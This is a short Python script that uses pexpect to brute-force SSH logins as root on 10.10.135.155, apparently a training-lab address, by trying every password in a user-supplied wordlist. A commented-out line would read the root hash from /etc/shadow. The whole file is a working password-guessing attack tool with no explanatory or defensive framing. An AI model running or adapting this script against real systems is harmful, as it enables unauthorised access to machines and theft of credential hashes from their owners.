#!/bin/python3

import pexpect




PROMPT=['#','>>>','>','\$','`$','$',':~$','root@10.10.135.155']

def connect(user,host,password):
    ssh_newkey='Are you sure you want to continue connecting'
    connstr='ssh '+user+'@'+host
    child=pexpect.spawn(connstr)
    ret=child.expect([pexpect.TIMEOUT,ssh_newkey,'[p|P]assword'])
    print(ret)
    if ret==0:
        print('[-] Error')
        return
    if ret==1:
        child.sendline('yes')
        ret=child.expect([pexpect.TIMEOUT,'[p|P]assword'])
        if ret==0:
            print('[-] Error')
            return
        try:
            child.sendline(password)
            child.expect(PROMPT)
        except Exception as e:
            print(e)
            exit()
      #  print(child)
        return child
    if ret==2:
        try:

            child.sendline(password)
            child.expect(PROMPT)
        except Exception as e:
            print(e)
            exit()
        print(child)
        return child

def send_command(child,command):
    child.sendline(command)
    child.expect(PROMPT)
    print(child.before)







def main():
  #  host=input('Enter the host ip > ')
    file_name=input('Enter the file_name > ')
  #  password=input('Enter the password of the host > ')
    fl=open(file_name,'r')
    for password in fl.readlines():
      password=password.strip('\n')
      child=connect('root','10.10.135.155',password)
   # child=connect(user,host,password)
   # send_command(child,'cat /etc/shadow | grep root;ps')
    #send_command(child,'pwd;ps')


main()
